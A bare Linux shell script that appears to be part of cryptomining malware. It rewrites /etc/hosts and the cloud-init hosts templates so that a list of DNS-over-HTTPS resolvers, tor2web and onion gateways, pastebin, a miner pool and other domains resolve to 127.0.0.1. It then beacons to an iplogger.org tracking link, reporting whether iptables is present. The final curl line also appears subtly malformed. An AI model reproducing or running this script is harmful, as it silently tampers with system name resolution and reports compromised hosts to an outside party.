h=(doh.defaultroutes.de dns.hostux.net dns.twnic.tw dns.rubyfish.cn doh.centraleu.pi-dns.com doh.dns.sb doh-fi.blahdns.com fi.doh.dns.snopyta.org uncensored.any.dns.nixnet.xyz tor2web.in tor2web.ch tor2web.io tor2web.to tor2web.su checkip.amazonaws.com ip.sb onion.foundation onion.com.de onion.sh 4tor.ml d2web.org onion.mn onion.in.net onion.to civiclink.network onion.pet onion.glass onion.ws aliyun.one lsd.systemten.org pastebin.com pm.cpuminerpool.com systemten.org relay.tor2socks.in)

f0="/etc/hosts"
f1="/etc/cloud/templates/hosts.redhat.tmpl"
f2="/etc/cloud/templates/hosts.debian.tmpl"
f3="/etc/cloud/templates/hosts.ubuntu.tmpl"

chekhosts () {
	for i in ${h[@]}; do
	sed -i '/'$i'/d' $f0
	sed -i '1 i\127.0.0.1 '$i'' $f0
	done
}

chek (){

if [ -f "$f1" ]; then
	for i in ${h[@]}; do
	sed -i '/'$i'/d' $f1
	sed -i '1 i\127.0.0.1 '$i'' $f1
	done
elif [ -f "$f2" ]; then
	for i in ${h[@]}; do
	sed -i '/'$i'/d' $f2
	sed -i '1 i\127.0.0.1 '$i'' $f2
		done
elif [ -f "$f3" ]; then
	for i in ${h[@]}; do
	sed -i '/'$i'/d' $f3
	sed -i '1 i\127.0.0.1 '$i'' $f3
	done
fi
}

chekhosts
chek


d=$(command -v iptables|wc -l)

if [ $d -eq "1" ]; then
	curl -A Iptables-found/1.9 -sLo https://iplogger.org/389LB3
else
        exit
fi
